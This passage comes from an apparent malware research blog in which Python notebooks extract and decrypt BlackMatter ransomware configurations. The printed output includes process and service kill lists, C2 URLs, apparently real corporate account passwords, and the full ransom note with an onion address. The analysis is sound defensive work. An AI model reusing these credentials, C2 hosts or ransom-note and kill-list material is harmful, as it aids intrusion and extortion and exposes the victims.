self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Extract Config . The Blackmatter config is stored in the PE resource section .rsrc. . The first QWORD of the resource is the seed for an lcg. . Following is a DWORD is the size of the encrypted config and is followed by the encrypted config data. . import struct import pefile RANSOMWARE_FILE = r&#39;/tmp/blackmatter_v3.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) # Get resource data r_data = None for s in pe.sections: if b&#39;rsrc&#39; in s.Name: r_data = s.get_data() print(&quot;Resource data length: %s&quot; % hex(len(r_data))) # Parse data from resource seed = struct.unpack(&#39;&lt;Q&#39;,r_data[:8])[0] data_size = struct.unpack(&#39;&lt;I&#39;,r_data[8:12])[0] enc_data = r_data[12:] print(&quot;Seed: %s&quot; % hex(seed)) print(&quot;Size: %s&quot; % hex(data_size)) print(&quot;Encrypted data example: %s...&quot; % tohex(enc_data[:20])) . Resource data length: 0xe00 Seed: 0x910fde2951947bbf Size: 0xdbe Encrypted data example: b&#39;4f4c8b8161b0c98217024cce8d9e7a0a4864ab36&#39;... . Decryption Routine . This PRNG algorithim is injected into memory at runtime -- maybe an attempt to hide the algorithm from statica analysis? Not a very good attempt though.... . __int64 __stdcall sub_B45133(_DWORD *a1, _DWORD *a2) { __int64 v2; // rax v2 = ((__int64 (__stdcall *)(_DWORD, _DWORD, int, int))sub_B450FD)(*a2, a2[1], 0x4C957F2D, 0x5851F42D) + 0x14057B7EF767814F; *(_QWORD *)a2 = v2; return ((__int64 (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_B450FD)(*a1, a1[1], v2, HIDWORD(v2)); } . eax = 0x00a5f770 edx = 0x910fde29 . import struct def gen_key(seed, key_length): out = b&#39;&#39; tmp_seed = seed for i in range(key_length): tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF out += struct.pack(&#39;&lt;Q&#39;,(tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF) return out tmp_seed = seed tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF print(&quot;Test temp seed: %s&quot; % hex(tmp_seed)) print(&quot;Test xor key: %s&quot; % hex((tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF)) #E2 02 10 B2 F6 64 C5 B1 print(&quot;Real Temp seed: %s n n&quot; % hex(struct.unpack(&#39;&lt;Q&#39;,unhex(&#39;E2 02 10 B2 F6 64 C5 B1&#39;.replace(&#39; &#39;,&#39;&#39;)))[0])) # 09 21 30 FB 18 EB 52 6A print(&quot;Real Temp seed 2: %s&quot; % hex(struct.unpack(&#39;&lt;Q&#39;,unhex(&#39;09 21 30 FB 18 EB 52 6A&#39;.replace(&#39; &#39;,&#39;&#39;)))[0])) # FC9FF30B7AFBF8B7 tmp_seed = (0x5851F42D4C957F2D * tmp_seed + 0x14057B7EF767814F) &amp; 0xFFFFFFFFFFFFFFFF print(&quot;Test temp seed 2: %s&quot; % hex(tmp_seed)) print(&quot;Test xor key 2: %s&quot; % hex((tmp_seed * seed)&amp; 0xFFFFFFFFFFFFFFFF)) key_data = gen_key(seed, data_size) print(&quot;key: %s&quot; % tohex(key_data[:32])) print(&quot;data: %s&quot; % tohex(enc_data[:32])) # buff[0] ^ lo_al = 9e ^ 4f = d1 # buff[1] ^ lo_dh = 4c ^ 4f = 03 # buff[2] ^ lo_ah = bc ^ 8b = 37 # buff[3] ^ lo_dl = f9 ^ 81 = 78 # buff[4] ^ hi_al = fc ^ 61 = 9d for i in range(0,10,8): print(hex(enc_data[i] ^ key_data[i])) print(hex(enc_data[i+1] ^ key_data[i+5])) print(hex(enc_data[i+2] ^ key_data[i+1])) print(hex(enc_data[i+3] ^ key_data[i+4])) print(hex(enc_data[i+4] ^ key_data[i+2])) print(hex(enc_data[i+5] ^ key_data[i+7])) print(hex(enc_data[i+6] ^ key_data[i+3])) print(hex(enc_data[i+7] ^ key_data[i+6])) print(&quot; n n&quot;) . Test temp seed: 0xb1c564f6b21002e2 Test xor key: 0x7b0d4ff9b7fcbc9e Real Temp seed: 0xb1c564f6b21002e2 Real Temp seed 2: 0x6a52eb18fb302109 Test temp seed 2: 0x6a52eb18fb302109 Test xor key 2: 0xfc9ff30b7afbf8b7 key: b&#39;9ebcfcb7f94f0d7bb7f8fb7a0bf39ffc1cf036c7b11595d9dd871868434d676f&#39; data: b&#39;4f4c8b8161b0c98217024cce8d9e7a0a4864ab36c6254e94751162b199b5d58b&#39; 0xd1 0x3 0x37 0x78 0x9d 0xcb 0x7e 0x8f 0xa0 0xf1 0xb4 0xc5 0x76 0x62 0x0 0x95 . def decrypt(enc_data, data_size, seed): out = [] keystream = gen_key(seed, data_size) for i in range(0,data_size-8,8): out.append(enc_data[i] ^ key_data[i]) out.append(enc_data[i+1] ^ key_data[i+5]) out.append(enc_data[i+2] ^ key_data[i+1]) out.append(enc_data[i+3] ^ key_data[i+4]) out.append(enc_data[i+4] ^ key_data[i+2]) out.append(enc_data[i+5] ^ key_data[i+7]) out.append(enc_data[i+6] ^ key_data[i+3]) out.append(enc_data[i+7] ^ key_data[i+6]) return bytes(out) ap_data = decrypt(enc_data, data_size, seed) ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#39; xd17x x9d xcb~ x8f x9d xf1 xb4 xc5b x8f x95Tq[ x87 xf0 xfc x89 xa8 xe5 xf2 x81 xda xbd x87 x17g xd8 xb2 x97 x92 jS x1dp xf53`Ei xc7 x88 xfb xdab:5 x8a xcb xf0 x186 x15 x98 xe4l} xa3 xe5 xd3V{bY&#34; x969 xc3 x01f3 x13t~ x0cuu xe5 xd6 x1aGu x9ff x00 xbd x8emFU x99Zga x95 x08w xd4 x9d r xe0 x8e xe3 x06 / xaa x14 xcd xffR x01 x81 xd7 xea x00 xf0 x7f xc9 x87 x88iNY x1a1 T xe8 x80 r xaeqC U_ xa5 xb9 xa7{ xca^(^ x06 xd5 t xae&#34; x93 xa4X&gt; x00 x01 x01 x01 x01 x01 x01 x01 x01, x00 x00 x00 xa9 x00 x00 x00 xea x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb x01 x00 x00 xd0 x04 x00 x00] x05 x00 x00 xd6 x05 x00 x00 &#39; x07 x00 x00 xa5 xc8 xe6 x8fro4BrnX5Zms1fmgmp9Hypi0hCgPduMrclWUIq05OADb1eHAmezreXJI46rfXbELjszc67ztiIrrUJUtMlON1LsA7puHNgfKMOAvLUpTmZlNYac7GNXnwBwAAAAA= x00UqLSghWqzIY3WZfbVqvI/NH3zsibCQc59aY6wgDsa4SWrgzwNariy+RXqoUAAAAA x00k8UWrwAbmN9xl+JkwBxI3YAbWNsAHijNQBgQycAYkOlAGKDHgBywywAdgOfAHIDdgBww48AcGN3AGHjVQBnI2cAYwOHxlLpKMZbiSgAZEOMAHMDxABuA04CrnsnAG2jnABtgy9u3a0rAGyDdwByI4cAYmNUAHQjTQBpwx0AbIMmAG0jFAA6wZ8DYXuFAHZDJABnA1UAemOnAG2jJ/sv8oQAamOkAGTDbepsuzQAcCN03eMpMABxg6QAcYMkAGbDFwBhg1cAcqN0AAAAA x00ZQBuAGMAcwB2AGMAAAB0AGgAZQBiAGEAdAAAAG0AeQBkAGUAcwBrAHQAbwBwAHEAbwBzAAAAeABmAHMAcwB2AGMAYwBvAG4AAABmAGkAcgBlAGYAbwB4AAAAaQBuAGYAbwBwAGEAdABoAAAAdwBpAG4AdwBvAHIAZAAAAHMAdABlAGEAbQAAAHMAeQBuAGMAdABpAG0AZQAAAG4AbwB0AGUAcABhAGQAAABvAGMAbwBtAG0AAABvAG4AZQBuAG8AdABlAAAAbQBzAHAAdQBiAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAYQBnAG4AdABzAHYAYwAAAHMAcQBsAAAAZQB4AGMAZQBsAAAAcABvAHcAZQByAHAAbgB0AAAAbwB1AHQAbABvAG8AawAAAHcAbwByAGQAcABhAGQAAABkAGIAZQBuAGcANQAwAAAAaQBzAHEAbABwAGwAdQBzAHMAdgBjAAAAcwBxAGIAYwBvAHIAZQBzAGUAcgB2AGkAYwBlAAAAbwByAGEAYwBsAGUAAABvAGMAYQB1AHQAbwB1AHAAZABzAAAAZABiAHMAbgBtAHAAAABtAHMAYQBjAGMAZQBzAHMAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABvAGMAcwBzAGQAAABtAHkAZABlAHMAawB0AG8AcABzAGUAcgB2AGkAYwBlAAAAdgBpAHMAaQBvAAAAAAA= x00bQBlAHAAbwBjAHMAAABtAGUAbQB0AGEAcwAAAHYAZQBlAGEAbQAAAHMAdgBjACQAAABiAGEAYwBrAHUAcAAAAHMAcQBsAAAAdgBzAHMAAABtAHMAZQB4AGMAaABhAG4AZwBlAAAAAAC= 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&#39; . import base64 ptr = 0 rsa_data = ptxt_data[ptr:128] ptr += 128 affiliate_id_data = ptxt_data[ptr:ptr+32] ptr+= 32 config_flags = ptxt_data[ptr:ptr+22] ptr+= 9 config_values_offset = struct.unpack(&#39;&lt;I&#39;,ptxt_data[ptr:ptr+4])[0] config_values_buffer = ptxt_data[ptr+config_values_offset:] config_values = [] for c in config_values_buffer.split(b&#39; x00&#39;): config_values.append(base64.b64decode(c)) def is_ascii(s): return all(c &lt; 128 for c in s) print(&quot;RSA: %r n&quot; % rsa_data) print(&quot;Affiliate ID: %r n&quot; % affiliate_id_data) print(&quot;Flags: %s n&quot; % tohex(config_flags)) for c in config_values: if not is_ascii(c): c = new_data = decrypt(c,len(c), seed) print(&quot;%s n&quot; % b&#39; | &#39;.join([s.replace(b&#39; x00&#39;,b&#39;&#39;) for s in c.split(b&#39; x00 x00&#39;)])) . RSA: b&#39; xd17x x9d xcb~ x8f x9d xf1 xb4 xc5b x8f x95Tq[ x87 xf0 xfc x89 xa8 xe5 xf2 x81 xda xbd x87 x17g xd8 xb2 x97 x92 jS x1dp xf53`Ei xc7 x88 xfb xdab:5 x8a xcb xf0 x186 x15 x98 xe4l} xa3 xe5 xd3V{bY&#34; x969 xc3 x01f3 x13t~ x0cuu xe5 xd6 x1aGu x9ff x00 xbd x8emFU x99Zga x95 x08w xd4 x9d r xe0 x8e xe3 x06 / xaa x14 xcd xffR x01 x81 xd7 xea x00 xf0 x7f xc9 x87 x88i&#39; Affiliate ID: b&#39;NY x1a1 T xe8 x80 r xaeqC U_ xa5 xb9 xa7{ xca^(^ x06 xd5 t xae&#34; x93 xa4X&gt;&#39; Flags: b&#39;0001010101010101012c000000a9000000ea00000000&#39; b&#39;0 xc1 xbdW x89 x82 xd1f x82 x8d x90- - x88914 xfa xb2 xeba rIH( x8f xe8V!hQ? xf5 x83 xd2&amp;p xe7 x92 xe1 xd2 x95B xda xa0 xe2 xc6 x9bO xd9 x92 xb5p x1a xd9- xf0 x7f xf8 x89 x98 x89 x87v xb1 xe3 x83 x90 xf4Sf xd7 xb12 x0czE)C xac x8a L x15. xe9W&#39; b&#39; xcc xedn{ xe9 xd1{ x8b x80 xaao xd0 xadW xb2c xcd xe2&gt;y xad xd0 xc0 xac( xeb xbd x81 x18 x83 x03 xe3 # xff x04h xe0 xdb x05&#39; b&#34; r x8a xaaV xfc`/ xd2 xc6d x1ao; xe02B x9c x0e xa8j6 xc7 xefX x9dU x97 x8a xd8w xf8 x8e x8a x95S3 xddV x89 x05s xf7 xff x12 xcd xd0 xf8 xa8d xd3 x9eN x0e xbe9 xcdLa]b4pv x92 x85 x83 xac xe1 x1b xa0 xde, x1b x14 xee xba_ xf3 xf4 xff.{ L x99 x83U6 xe5w x9f x10? xc6b xbe] xed&#39;p xc1 xeb xca x04 xcf xc8 xa9 x12a@ x9f x87lm xf1 x0831 xef x08 xde x15 xcd xbd x08N xdb xe1) x91(v4 xe7^$h x84 xe3 xa9 x8c xcco x80 x97 x9c x93 xc6U rSn xcca xce xb5 xae xfa x08 xcb xf8 xab xe9 x88 xc2 x99 xe4 x19 x9eO x94 x97 xea xef x16 x14 x1a xcbf* xb3 xe9o xa2 xd9!_ x9f xd2&amp;((f x84 xd1 x10 xa2&#34; b&#39;encsvc | thebat | mydesktopqos | xfssvccon | firefox | infopath | winword | steam | synctime | notepad | ocomm | onenote | mspub | thunderbird | agntsvc | sql | excel | powerpnt | outlook | wordpad | dbeng50 | isqlplussvc | sqbcoreservice | oracle | ocautoupds | dbsnmp | msaccess | tbirdconfig | ocssd | mydesktopservice | visio | | &#39; b&#39;mepocs | memtas | veeam | svc$ | backup | sql | vss | msexchange | | &#39; b&#39;https://fluentzip.org | http://fluentzip.org | | &#39; b&#39;OFMO220@R5-CORE.R5.AIG.NET:yhU6VJ$&amp;amp | nq7tA9 | OSYST93@R5-CORE.R5.AIG.NET:RPo@ndf9 | OFMO225@R5-CORE.R5.AIG.NET:DH5U87@rA0ELa2 | &#39; b&#34; ~+ r n * + r n &#39; BLACK | r n () .-.,=&#39;``&#39;=. - o - r n &#39;=/_ | r n * | &#39;=._ | r n `=./`, &#39; r n . &#39;=.__.=&#39; `=&#39; * r n + Matter + r n O * &#39; . r n r n&gt;&gt;&gt; What happens? r n Your network is encrypted, and currently not operational. r n We need only money, after payment we will give you a decryptor for the entire network and you will restore all the data. r n r n&gt;&gt;&gt; What data stolen? r n From your network was stolen large amount of data. r n If you do not contact us we will publish all your data in our blog and will send it to the biggest mass media. r n r n&gt;&gt;&gt; What guarantees? r n We are not a politically motivated group and we do not need anything other than your money. r n If you pay, we will provide you the programs for decryption and we will delete your data. r n If we do not give you decrypters or we do not delete your data, no one will pay us in the future, this does not comply with our goals. r n We always keep our promises. r n r n&gt;&gt; How to contact with us? r n 1. Download and install TOR Browser (https://www.torproject.org/). r n 2. Open http://supp24maprinktc7uizgfyqhisx7lkszb6ogh6lwdzpac23w3mh4tvyd.onion/U6H6RKDF6W3B8XOWL r n r n&gt;&gt; Warning! Recovery recommendations. r n We strongly recommend you to do not MODIFY or REPAIR your files, that will damag&#34; .",
            "url": "https://research.openanalysis.net/blackmatter/ransomware/malware/config/2021/10/30/blackmatter_ransomware_v3.html",
            "relUrl": "/blackmatter/ransomware/malware/config/2021/10/30/blackmatter_ransomware_v3.html",
            "date": " ‚Ä¢ Oct 30, 2021"
        }
        
    
  
    
        ,"post72": {
            "title": "BlackMatter Ransomware",
            "content": "Overview . Sample: 22d7d67c3af10b1a37f277ebabe2d1eb4fd25afbd6437d4377400e148bcc08d6 . References: . Malware Bazaar Sample | ChuongDong Blog | CARBON SPIDER Attribution | . Helper Functions . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . API Hashing . def ror(value, count=1, base=8): value = (value &gt;&gt; count | value &lt;&lt; (base - count)) &amp; (2**base - 1) return value . out = 0 for i in &#39;ntdll.dll x00&#39;: out = (ord(i) + ror(out, count=13, base=32)) &amp; 0xffffffff print(hex(out)) . 0x411677b7 . Config Decryption . APLib . Credit: Sandor Nemes (snemes) . import struct from binascii import crc32 from io import BytesIO __all__ = [&#39;APLib&#39;, &#39;decompress&#39;] __version__ = &#39;0.6&#39; __author__ = &#39;Sandor Nemes&#39; class APLib(object): __slots__ = &#39;source&#39;, &#39;destination&#39;, &#39;tag&#39;, &#39;bitcount&#39;, &#39;strict&#39; def __init__(self, source, strict=True): self.source = BytesIO(source) self.destination = bytearray() self.tag = 0 self.bitcount = 0 self.strict = bool(strict) def getbit(self): # check if tag is empty self.bitcount -= 1 if self.bitcount &lt; 0: # load next tag self.tag = ord(self.source.read(1)) self.bitcount = 7 # shift bit out of tag bit = self.tag &gt;&gt; 7 &amp; 1 self.tag &lt;&lt;= 1 return bit def getgamma(self): result = 1 # input gamma2-encoded bits while True: result = (result &lt;&lt; 1) + self.getbit() if not self.getbit(): break return result def depack(self): r0 = -1 lwm = 0 done = False try: # first byte verbatim self.destination += self.source.read(1) # main decompression loop while not done: if self.getbit(): if self.getbit(): if self.getbit(): offs = 0 for _ in range(4): offs = (offs &lt;&lt; 1) + self.getbit() if offs: self.destination.append(self.destination[-offs]) else: self.destination.append(0) lwm = 0 else: offs = ord(self.source.read(1)) length = 2 + (offs &amp; 1) offs &gt;&gt;= 1 if offs: for _ in range(length): self.destination.append(self.destination[-offs]) else: done = True r0 = offs lwm = 1 else: offs = self.getgamma() if lwm == 0 and offs == 2: offs = r0 length = self.getgamma() for _ in range(length): self.destination.append(self.destination[-offs]) else: if lwm == 0: offs -= 3 else: offs -= 2 offs &lt;&lt;= 8 offs += ord(self.source.read(1)) length = self.getgamma() if offs &gt;= 32000: length += 1 if offs &gt;= 1280: length += 1 if offs &lt; 128: length += 2 for _ in range(length): self.destination.append(self.destination[-offs]) r0 = offs lwm = 1 else: self.destination += self.source.read(1) lwm = 0 except (TypeError, IndexError): if self.strict: raise RuntimeError(&#39;aPLib decompression error&#39;) return bytes(self.destination) def pack(self): raise NotImplementedError def aplib_decompress(data, strict=False): packed_size = None packed_crc = None orig_size = None orig_crc = None if data.startswith(b&#39;AP32&#39;) and len(data) &gt;= 24: # data has an aPLib header header_size, packed_size, packed_crc, orig_size, orig_crc = struct.unpack_from(&#39;=IIIII&#39;, data, 4) data = data[header_size : header_size + packed_size] if strict: if packed_size is not None and packed_size != len(data): raise RuntimeError(&#39;Packed data size is incorrect&#39;) if packed_crc is not None and packed_crc != crc32(data): raise RuntimeError(&#39;Packed data checksum is incorrect&#39;) result = APLib(data, strict=strict).depack() if strict: if orig_size is not None and orig_size != len(result): raise RuntimeError(&#39;Unpacked data size is incorrect&#39;) if orig_crc is not None and orig_crc != crc32(result): raise RuntimeError(&#39;Unpacked data checksum is incorrect&#39;) return result . Extract Config . The Blackmatter config is stored in the PE resource section .rsrc. . The first DWORD of the resource is the seed for an lcg that closely matches the zipcrypto lcg with constant 0x8088405. . The second DWORD is the size of the encrypted config and is followed by the encrypted config data. . import struct import pefile RANSOMWARE_FILE = r&#39;/tmp/blackmatter.bin&#39; data = open(RANSOMWARE_FILE, &#39;rb&#39;).read() pe = pefile.PE(data = data) # Get resource data r_data = None for s in pe.sections: if b&#39;rsrc&#39; in s.Name: r_data = s.get_data() # Parse data from resource seed = struct.unpack(&#39;&lt;I&#39;,r_data[:4])[0] data_size = struct.unpack(&#39;&lt;I&#39;,r_data[4:8])[0] enc_data = r_data[8:] print(&quot;Seed: %s&quot; % hex(seed)) print(&quot;Size: %d&quot; % data_size) . Seed: 0xffcaa1ea Size: 3487 . Decryption Routine . Reference: Tesorion Blackmatter blog . def decrypt(enc_data, data_size, seed): fixed = seed decrypted = bytearray() for i in range(data_size-1): if i &amp; 3 == 0: next_value = struct.unpack(&#39;&lt;I&#39;,enc_data[i:i+4])[0] seed = (0x8088405 * seed + 1) &amp; 0xffffffff rnd = ((seed * fixed) &gt;&gt; 32) &amp; 0xffffffff dw = next_value ^ rnd decrypted.append((dw &gt;&gt; ((i &amp; 3) * 8)) &amp; 0xff) return decrypted . def gen_key_stream(seed, key_length): fixed = seed keystream = b&#39;&#39; for i in range(0,key_length-1,4): seed = (0x8088405 * seed + 1) &amp; 0xffffffff key_dw = ((seed * fixed) &gt;&gt; 32) &amp; 0xffffffff keystream += struct.pack(&#39;&lt;I&#39;,key_dw) return keystream def decrypt(enc_data, data_size, seed): out = [] keystream = gen_key_stream(seed, data_size) for i in range(data_size): out.append(enc_data[i] ^ keystream[i]) return bytes(out) ap_data = decrypt(enc_data, data_size, seed) ptxt_data = aplib_decompress(ap_data) ptxt_data . b&#39; x87 x19 xa80 xf4 xba x94 x94 x92 x91X+fT xf9l x96 xd9 xa0 xf4A x9fR xf3g xcf. x19 xb9 xc9Z x9bp x91 xcb xef xaf xbeZ xe3 x9d xae(X x94Y n x8d xb8 xb7d xe5r xfa xb5#FF xf8e x9a xda/ xbd x8c7 xbf xdd xd6 x07 x97 xa5 xad x9d xad- xed7 x96 x9d x17 x9e xa4 xadL x19 x80 xd0 xe7 x0b x05bA xd3% xe1 x8b xeb xc4 x92_ xa5j xbf x81 x0f x91ny2 xd0 x16 xa8n: xd9wI xe7_ x901 x11K x06 x0bVQ$x xc0 x8d xad xa2 xaf x19 xe4 x98 x08 xfb xda[ x0b xa6 xf30 xb0 x9c xd4{O xb9!Ox6 xaaF xad x00 x01 x01 x01 x01 x01 x01 x01$ x00 x00 x00 xa1 x00 x00 x00 xe2 x00 x00 x00 x00 x00 x00 x00 xf3 x01 x00 x00 xc8 x04 x00 x009 x05 x00 x002 x06 x00 x00 x1f x07 x00 x00ro4BrnX5Zms1fmgmp9Hypi0hCgPduMrclWUIq05OADb1eHAmezreXJI46rfXbELjszc67ztiIrrUJUtMlON1LsA7puHNgfKMOAvLUpTmZlNYac7GNXnwBwAAAAB= x00UqLSghWqzIY3WZfbVqvI/NH3zsibCQc59aY6wgDsa4SWrgzwNariy+RXqoUAAAAA x00k8UWrwAbmN9xl+JkwBxI3YAbWNsAHijNQBgQycAYkOlAGKDHgBywywAdgOfAHIDdgBww48AcGN3AGHjVQBnI2cAYwOHxlLpKMZbiSgAZEOMAHMDxABuA04CrnsnAG2jnABtgy9u3a0rAGyDdwByI4cAYmNUAHQjTQBpwx0AbIMmAG0jFAA6wZ8DYXuFAHZDJABnA1UAemOnAG2jJ/sv8oQAamOkAGTDbepsuzQAcCN03eMpMABxg6QAcYMkAGbDFwBhg1cAcqN0AAAAA x00ZQBuAGMAcwB2AGMAAAB0AGgAZQBiAGEAdAAAAG0AeQBkAGUAcwBrAHQAbwBwAHEAbwBzAAAAeABmAHMAcwB2AGMAYwBvAG4AAABmAGkAcgBlAGYAbwB4AAAAaQBuAGYAbwBwAGEAdABoAAAAdwBpAG4AdwBvAHIAZAAAAHMAdABlAGEAbQAAAHMAeQBuAGMAdABpAG0AZQAAAG4AbwB0AGUAcABhAGQAAABvAGMAbwBtAG0AAABvAG4AZQBuAG8AdABlAAAAbQBzAHAAdQBiAAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAYQBnAG4AdABzAHYAYwAAAHMAcQBsAAAAZQB4AGMAZQBsAAAAcABvAHcAZQByAHAAbgB0AAAAbwB1AHQAbABvAG8AawAAAHcAbwByAGQAcABhAGQAAABkAGIAZQBuAGcANQAwAAAAaQBzAHEAbABwAGwAdQBzAHMAdgBjAAAAcwBxAGIAYwBvAHIAZQBzAGUAcgB2AGkAYwBlAAAAbwByAGEAYwBsAGUAAABvAGMAYQB1AHQAbwB1AHAAZABzAAAAZABiAHMAbgBtAHAAAABtAHMAYQBjAGMAZQBzAHMAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABvAGMAcwBzAGQAAABtAHkAZABlAHMAawB0AG8AcABzAGUAcgB2AGkAYwBlAAAAdgBpAHMAaQBvAAAAAAA= x00bQBlAHAAbwBjAHMAAABtAGUAbQB0AGEAcwAAAHYAZQBlAGEAbQAAAHMAdgBjACQAAABiAGEAYwBrAHUAcAAAAHMAcQBsAAAAdgBzAHMAAAAAAM== 